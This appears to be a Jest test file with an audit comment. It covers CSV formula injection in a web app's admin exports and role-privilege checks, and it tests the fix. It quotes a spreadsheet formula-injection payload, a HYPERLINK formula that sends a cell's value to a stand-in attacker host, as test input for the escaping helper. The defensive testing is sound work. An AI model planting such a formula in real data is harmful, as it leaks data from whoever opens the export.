/**
 * @jest-environment node
 */

/**
 * Who may administer what, and what an export puts in a spreadsheet.
 *
 * Four findings from reading the 119 API routes, three fixed here and one
 * recorded because resolving it is a decision rather than a repair.
 *
 * 1. CSV FORMULA INJECTION IN EVERY EXPORT BUT ONE
 * ------------------------------------------------
 * Three of the four CSV exports built cells by hand:
 *
 *     admin/export/users               `"${String(c).replace(/"/g, '""')}"`
 *     admin/export/cooperative-members `"${String(c).replace(/"/g, '""')}"`
 *     admin/wave/reports/export        `"${cell}"`
 *
 * The first two double embedded quotes and neutralise nothing; the third does
 * neither. Every one of them writes values a user typed into their own profile
 * — full name, email, business name, state, LGA.
 *
 * A spreadsheet treats a cell beginning with `=`, `+`, `-` or `@` as a formula
 * when the file is opened, and strips the quotes before deciding. So a user
 * whose name is `=HYPERLINK("https://evil.example?d="&A1,"Payroll")` gets a
 * working link, labelled however they like, in the spreadsheet of whoever
 * exports the user list. The WAVE export has the additional problem that an
 * unescaped `"` ends the field early and shifts everything after it into the
 * wrong columns.
 *
 * The correct version already existed. `csvCell` — quoting AND neutralisation —
 * was written for the audit-log export and left private to that one file. The
 * users export even applies the same apostrophe trick to `phone`, to preserve
 * leading zeros: the technique was known, and used on the one column where the
 * motivation was cosmetic.
 *
 * 2. PRIVILEGED_ROLES WENT STALE
 * ------------------------------
 * `["admin", "super_admin"]`, hand-written. Six module-admin roles were added
 * to PERMISSION_MATRIX afterwards and this was not revisited, so
 * `cooperative_admin` — which holds "cooperatives:manage_products", withheld
 * from `admin` — became grantable by any admin, who could assign it to
 * themselves.
 *
 * Latent rather than live: nothing checks that permission today, so it gates
 * nothing. A guard that is correct only because the thing it protects is unused
 * is not a guard, and it is derived from the matrix now.
 *
 * 3. SIX ANSWERS TO "WHAT IS A ROLE"
 * ----------------------------------
 * UserRole (21), add-roles VALID_ROLES (13), schemas.ts UserRoleSchema (14),
 * write-guard VALID_ROLES (19, including four strings that are not roles),
 * PERMISSION_MATRIX (10, including two that appear nowhere else), and
 * bulkAssignRolesAction, which validated nothing.
 *
 * The combination that mattered: isAdmin() honours "moderator" and "support";
 * 32 admin routes are gated on isAdmin(); and the only writer that could
 * produce those strings was the one with no validation. Admin access under a
 * name that no type, schema or screen lists as admin access.
 *
 * 4. RECORDED, NOT FIXED: isAdmin() IS TEN ROLES AND THE MATRIX MEANS TWO
 * -----------------------------------------------------------------------
 * 32 of the 48 routes under /api/admin gate on isAdmin(), which accepts
 * super_admin, admin, moderator, support and all six module admins. Four
 * consult PERMISSION_MATRIX. So an academy_admin can create and delete
 * cooperative loan products, reject loan applications, approve and suspend
 * marketplace sellers, approve land verifications, and download every user's
 * personal data.
 *
 * The matrix says otherwise — "cooperatives:manage_products" is held by
 * super_admin and cooperative_admin alone — and that permission is checked
 * nowhere in the codebase.
 *
 * NOT FIXED, because narrowing those routes to the matrix would lock out plain
 * `admin`, which does not hold the module permissions either. Whether admin
 * should manage cooperative loan products is a product decision, and audit-log
 * -actions.ts already records the same tension from the other side: it
 * deliberately refuses to use hasAdminPermission("audit:read") because the
 * matrix grants that to nine roles. Two files reaching opposite conclusions
 * about the same matrix is the thing to resolve; neither is a bug to patch.
 */

import { describe, it, expect } from '@jest/globals';
import { readFileSync } from 'fs';
import { execSync } from 'child_process';
import { join } from 'path';
import { csvCell, csvRow, csvDocument } from '@/lib/csv-safe';
import { PRIVILEGED_ROLES, ALL_ADMIN_ROLES, ALL_ADMIN_PERMISSIONS, includesPrivilegedRole, isAdmin, hasAdminPermission } from '@/lib/admin-permissions';
import { ALL_USER_ROLES, isUserRole } from '@/lib/types/roles';

function source(rel: string): string {
    return readFileSync(join(process.cwd(), rel), 'utf-8');
}

function codeOnly(src: string): string {
    return src
        .split('\n')
        .filter((l) => {
            const t = l.trim();
            return !t.startsWith('//') && !t.startsWith('*') && !t.startsWith('/*');
        })
        .join('\n');
}

const CSV_EXPORTS = [
    'src/app/api/admin/export/users/route.ts',
    'src/app/api/admin/export/cooperative-members/route.ts',
    'src/app/api/admin/wave/reports/export/route.ts',
    'src/app/actions/audit-log-actions.ts',
];

describe('a name cannot become a formula in an admin spreadsheet', () => {
    it('neutralises every character a spreadsheet reads as a formula', () => {
        // THE test. Quoting alone does not help: the quotes are stripped before
        // the cell is classified.
        for (const lead of ['=', '+', '-', '@', '\t', '\r']) {
            expect(csvCell(`${lead}HYPERLINK("x")`)).toBe(`"'${lead}HYPERLINK(""x"")"`);
        }
    });

    it('neutralises the payload from a real profile field', () => {
        const name = '=HYPERLINK("https://evil.example?d="&A1,"Payroll")';

        expect(csvCell(name).startsWith(`"'=`)).toBe(true);
    });

    it('still doubles embedded quotes', () => {
        // The WAVE export did not, so a business name containing a quote ended
        // the field early and shifted every later column.
        expect(csvCell('Acme "Holdings" Ltd')).toBe('"Acme ""Holdings"" Ltd"');
    });

    it('leaves ordinary values alone', () => {
        // Vacuity guard: prefixing everything would satisfy the assertions above
        // and corrupt every cell in every export.
        expect(csvCell('Ada Lovelace')).toBe('"Ada Lovelace"');
        expect(csvCell('ada@example.com')).toBe('"ada@example.com"');
        expect(csvCell(42)).toBe('"42"');
        expect(csvCell(null)).toBe('""');
        expect(csvCell(undefined)).toBe('""');
    });

    it('does not double-prefix a value already made safe', () => {
        // The users export prefixes `phone` with an apostrophe to keep leading
        // zeros. An apostrophe is not a formula lead, so it passes through.
        expect(csvCell("'08012345678")).toBe(`"'08012345678"`);
    });

    it('builds rows and documents through the same rule', () => {
        expect(csvRow(['a', '=b'])).toBe(`"a","'=b"`);
        expect(csvDocument(['H1'], [['=x']])).toBe(`"H1"\n"'=x"`);
    });

    it('every CSV export uses the shared helper', () => {
        // The sweep. A new export that hand-rolls its quoting is the way this
        // comes back — it is how three of the four got here.
        for (const file of CSV_EXPORTS) {
            expect(source(file)).toContain('@/lib/csv-safe');
        }
    });

    it('no export builds a cell by hand any more', () => {
        for (const file of CSV_EXPORTS) {
            const code = codeOnly(source(file));

            expect(code).not.toContain(`replace(/"/g, '""')`);
            expect(code).not.toMatch(/`"\$\{cell\}"`/);
        }
    });

    it('finds every CSV producer, not just the four known ones', () => {
        // Guard against the list above going stale the way the role lists did.
        const producers = execSync(
            `grep -rl 'text/csv' src --include='*.ts' | grep -v __tests__ || true`,
            { encoding: 'utf-8', cwd: process.cwd() }
        ).split('\n').filter(Boolean);

        expect(producers.length).toBeGreaterThan(0);
        for (const p of producers) {
            expect(source(p)).toContain('@/lib/csv-safe');
        }
    });
});

describe('a role that can do more than admin is super_admin-only to grant', () => {
    it('the rule holds in BOTH directions, for every role in the matrix', () => {
        // THIS TEST USED TO NAME ITS EXAMPLE. It asserted that
        // `cooperative_admin` is privileged because it holds
        // cooperatives:manage_products and `admin` did not — the regression the
        // hand-written list had missed.
        //
        // The owner has since granted that permission to `admin`, which was the
        // decision two earlier findings explicitly left open (the note on
        // PRIVILEGED_ROLES, and loan-products.ts's "the owner's call"). So the
        // example is gone, and the rule is not: nothing in the matrix currently
        // exceeds `admin`, which means PRIVILEGED_ROLES is exactly
        // ["admin", "super_admin"] — what its name says.
        //
        // A test that only checked the old example would now be vacuous. This
        // asserts the PROPERTY instead, in both directions, so it keeps its
        // teeth with no example to point at: any role that gains a permission
        // `admin` lacks becomes super_admin-only to grant, and any role in the
        // set has a reason to be there.
        // Vacuity guard. `surplus` is computed by sweeping every permission, so
        // an empty ALL_ADMIN_PERMISSIONS would make the whole property below
        // pass without testing anything — which a mutation proved it did.
        expect(ALL_ADMIN_PERMISSIONS.length).toBeGreaterThan(20);
        for (const p of [
            'users:read', 'users:delete', 'cooperatives:manage_products',
            'academy:manage_courses', 'config:rollback',
        ] as const) {
            expect({ p, listed: (ALL_ADMIN_PERMISSIONS as readonly string[]).includes(p) })
                .toEqual({ p, listed: true });
        }

        const surplus = ALL_ADMIN_ROLES.filter(role =>
            role !== 'admin' && role !== 'super_admin' &&
            ALL_ADMIN_PERMISSIONS.some(p => hasAdminPermission([role], p) && !hasAdminPermission(['admin'], p))
        );

        // Every role with a surplus is privileged...
        for (const role of surplus) {
            expect({ role, privileged: includesPrivilegedRole([role]) })
                .toEqual({ role, privileged: true });
        }
        // ...and every privileged role beyond the two definitional ones has a surplus.
        for (const role of PRIVILEGED_ROLES) {
            if (role === 'admin' || role === 'super_admin') continue;
            expect({ role, hasSurplus: (surplus as readonly string[]).includes(role) })
                .toEqual({ role, hasSurplus: true });
        }

        expect([...PRIVILEGED_ROLES].sort()).toEqual(['admin', 'super_admin']);
        expect(includesPrivilegedRole(['admin'])).toBe(true);
        expect(includesPrivilegedRole(['cooperative_admin'])).toBe(false);
    });

    it('is derived from the matrix rather than listed', () => {
        // So adding a permission to any module-admin role makes that role
        // super_admin-only to grant, with nobody remembering to come here.
        expect(codeOnly(source('src/lib/admin-permissions.ts')))
            .toContain('PERMISSION_MATRIX.admin');
        expect(codeOnly(source('src/lib/admin-permissions.ts')))
            .not.toContain('PRIVILEGED_ROLES = ["admin", "super_admin"] as const');
    });

    it('still holds the two it always did', () => {
        expect(includesPrivilegedRole(['admin'])).toBe(true);
        expect(includesPrivilegedRole(['super_admin'])).toBe(true);
    });

    it('does not privilege a role with no surplus over admin', () => {
        // Vacuity guard: marking everything privileged would pass the checks
        // above and stop admins doing their job.
        for (const role of ['wave_admin', 'marketplace_admin', 'moderator', 'support', 'seller']) {
            expect(includesPrivilegedRole([role])).toBe(false);
        }
        expect(includesPrivilegedRole([])).toBe(false);
        expect(includesPrivilegedRole(undefined)).toBe(false);
    });

    it('both role writers use the shared rule', () => {
        for (const file of [
            'src/app/actions/bulk-user-operations.ts',
            'src/app/actions/admin/_users.ts',
            'src/app/api/admin/add-roles/route.ts',
        ]) {
            expect(source(file)).toContain('includesPrivilegedRole');
        }

        // And none keeps a local copy of it.
        expect(codeOnly(source('src/app/api/admin/add-roles/route.ts')))
            .not.toContain('privilegedRoles: UserRole[] = ["admin", "super_admin"]');
    });
});

describe('there is one answer to what a role is', () => {
    it('the value list matches the type exactly', () => {
        // The `satisfies` clause proves every entry is a UserRole; the Record
        // proves every UserRole is an entry. Both compile-time; this is the
        // runtime spot check that the file was not edited past them.
        expect(ALL_USER_ROLES).toContain('cooperative_admin');
        expect(ALL_USER_ROLES).toContain('marketplace_seller');
        expect(ALL_USER_ROLES).toContain('super_admin');
        expect(new Set(ALL_USER_ROLES).size).toBe(ALL_USER_ROLES.length);
    });

    it('rejects the two roles that isAdmin honours but nothing declares', () => {
        // THE hole. moderator and support pass isAdmin(), and 32 admin routes
        // gate on isAdmin(). They belong to no type, schema or screen.
        expect(isAdmin(['moderator'])).toBe(true);
        expect(isAdmin(['support'])).toBe(true);

        expect(isUserRole('moderator')).toBe(false);
        expect(isUserRole('support')).toBe(false);
    });

    it('rejects strings that were only ever typos', () => {
        for (const s of ['academy_student', 'wave_member', 'farm_nation_member', 'exporter', 'user', '', 'ADMIN']) {
            expect(isUserRole(s)).toBe(false);
        }
    });

    it('accepts the real ones', () => {
        // Vacuity guard: a predicate that refuses everything passes the two
        // tests above and breaks role assignment entirely.
        for (const r of ALL_USER_ROLES) {
            expect(isUserRole(r)).toBe(true);
        }
    });

    it('the bulk writer validates role names', () => {
        // It accepted any string. add-roles validated and it did not, so the two
        // writers of one field disagreed about what a role is.
        const bulk = source('src/app/actions/bulk-user-operations.ts');

        expect(bulk).toContain('isUserRole');
        expect(bulk).toContain('Unknown role(s)');

        // Checked on both lists — a name being removed can be a typo too, and a
        // silent no-op reported as success is how the caller learns nothing.
        expect(bulk).toContain('[...rolesToAdd, ...rolesToRemove]');
    });

    it('add-roles uses the canonical list instead of its own thirteen', () => {
        const route = source('src/app/api/admin/add-roles/route.ts');

        expect(route).toContain('VALID_ROLES: readonly UserRole[] = ALL_USER_ROLES');
        // Its doc comment offered cooperative_admin and wave_admin as examples
        // of what a regular admin may assign, and the list rejected both.
        expect(ALL_USER_ROLES).toContain('wave_admin');
    });
});

describe('isAdmin() is ten roles and the matrix means two', () => {
    /** Routes under /api/admin whose only authority check is isAdmin(). */
    function isAdminGatedRoutes(): string[] {
        return execSync(
            `grep -rl 'isAdmin(' src/app/api/admin --include='route.ts' || true`,
            { encoding: 'utf-8', cwd: process.cwd() }
        ).split('\n').filter(Boolean);
    }

    it('isAdmin accepts every module admin, plus two undeclared roles', () => {
        for (const role of [
            'super_admin', 'admin', 'moderator', 'support',
            'wave_admin', 'cooperative_admin', 'marketplace_admin',
            'export_admin', 'farm_nation_admin', 'academy_admin',
        ]) {
            expect(isAdmin([role])).toBe(true);
        }
        // Vacuity guard.
        expect(isAdmin(['seller'])).toBe(false);
        expect(isAdmin([])).toBe(false);
    });

    it('and the routes that WRITE no longer gate on it', () => {
        // FIXED. This recorded ">= 25 admin routes gated on isAdmin()"; the
        // write-side of that is now on the matrix, and the remainder are reads.
        // Kept as a ceiling so that adding a route back onto isAdmin() is a
        // visible change to this number rather than a silent one.
        //
        // grep -l matches comments too, so two of the survivors are files whose
        // prose mentions the old guard. The structural, per-function assertion
        // lives in admin-permission-gates.test.ts.
        expect(isAdminGatedRoutes().length).toBeLessThanOrEqual(15);
    });

    it('the cooperative money routes among them', () => {
        // These were THE concrete consequence: an academy_admin could price and
        // delete cooperative loan products and reject applications.
        //
        // This used to pin the permission STRING, and all five named
        // "cooperatives:approve_loans". The three CATALOGUE routes now name
        // "cooperatives:manage_products" instead — the permission they always
        // meant, which they could not use while the matrix withheld it from the
        // plain `admin` role. Pinning the string again would just re-freeze the
        // split; what this test is actually about is that each route asks the
        // MATRIX, and that a foreign module's admin is refused. Both are
        // asserted directly now, so the next such move does not read as a
        // regression.
        const CATALOGUE = ['create-loan-product', 'update-loan-product', 'delete-loan-product'];
        const APPLICATIONS = ['reject-loan', 'approve-loan'];

        for (const r of [...CATALOGUE, ...APPLICATIONS]) {
            expect(source(`src/app/api/admin/cooperative/${r}/route.ts`))
                .toMatch(/hasAdminPermission\(session\.user\.roles, "cooperatives:\w+"\)/);
        }

        // The catalogue and the applications are different acts, and say so.
        for (const r of CATALOGUE) {
            expect(source(`src/app/api/admin/cooperative/${r}/route.ts`))
                .toContain('hasAdminPermission(session.user.roles, "cooperatives:manage_products")');
        }
        for (const r of APPLICATIONS) {
            expect(source(`src/app/api/admin/cooperative/${r}/route.ts`))
                .toContain('hasAdminPermission(session.user.roles, "cooperatives:approve_loans")');
        }

        // And the consequence this test exists for is unchanged: neither
        // permission reaches outside the cooperative silo.
        for (const p of ['cooperatives:manage_products', 'cooperatives:approve_loans'] as const) {
            expect({ p, academy: hasAdminPermission(['academy_admin'], p) })
                .toEqual({ p, academy: false });
            expect({ p, wave: hasAdminPermission(['wave_admin'], p) })
                .toEqual({ p, wave: false });
            expect({ p, coop: hasAdminPermission(['cooperative_admin'], p) })
                .toEqual({ p, coop: true });
        }
    });

    it('but the two bulk exports of personal data still do — RECORDED, not fixed', () => {
        // Both hand back every user's personal details, and any of the ten roles
        // can call them. They are READS, so they are outside the write-side
        // sweep, and every admin role holds "users:read" — the matrix has no
        // narrower answer to offer without inventing one. "audit:export" would
        // fit the act but is withheld from the plain `admin` role, so adopting
        // it would deny the platform's own administrators a bulk export they can
        // perform today.
        //
        // Narrowing who may export the entire user base is a policy decision,
        // and it is the owner's.
        for (const r of ['export/users', 'export/cooperative-members']) {
            expect(source(`src/app/api/admin/${r}/route.ts`)).toContain('isAdmin(');
        }

        expect(hasAdminPermission(['academy_admin'], 'users:read' as any)).toBe(true);
        expect(hasAdminPermission(['admin'], 'audit:export' as any)).toBe(false);
    });

    it('the permission that would express the boundary is now the one that does', () => {
        // THE EXACT INVERSE OF WHAT THIS ASSERTED, and it is the same fact.
        //
        // It used to read "the permission that would express the boundary is
        // checked nowhere": cooperatives:manage_products existed in the union,
        // was granted to super_admin and cooperative_admin, and NOTHING asked
        // for it. loan-products.ts even explained in a comment why it
        // deliberately did not — the matrix withheld manage_products from the
        // plain `admin` role, so gating on it "would take away something an
        // admin can do today" — and left the decision to the owner.
        //
        // The owner granted it to `admin`. The seven loan-CATALOGUE gates then
        // moved onto it, because the objection was the only thing holding them
        // on a permission about approving individual applications. So the
        // permission gates something now, and this asserts that rather than the
        // gap it replaced.
        const askers = execSync(
            `grep -rln 'hasAdminPermission([^)]*cooperatives:manage_products' src --include='*.ts' --include='*.tsx' || true`,
            { encoding: 'utf-8', cwd: process.cwd() }
        ).split('\n').filter(Boolean).filter((f) => !f.includes('__tests__')).sort();

        expect(askers).toEqual([
            'src/app/actions/loan-products.ts',
            'src/app/api/admin/cooperative/create-loan-product/route.ts',
            'src/app/api/admin/cooperative/delete-loan-product/route.ts',
            'src/app/api/admin/cooperative/update-loan-product/route.ts',
        ]);

        // And the move cost nobody their access: the permission it replaced is
        // held by exactly the same three roles.
        const holders = (p: string) =>
            ALL_ADMIN_ROLES.filter((r) => hasAdminPermission([r], p as any)).sort();
        expect(holders('cooperatives:manage_products')).toEqual(holders('cooperatives:approve_loans'));
        expect(holders('cooperatives:manage_products')).toEqual(['admin', 'cooperative_admin', 'super_admin']);
    });

    it('the other side of the same tension is already recorded in the codebase', () => {
        // audit-log-actions.ts refuses to use hasAdminPermission("audit:read")
        // precisely because the matrix grants it to nine roles. One file finds
        // the matrix too broad, thirty-two ignore it as too narrow.
        expect(source('src/app/actions/audit-log-actions.ts'))
            .toContain('the matrix grants');
        expect(hasAdminPermission(['support'], 'audit:read' as any)).toBe(true);
    });
});
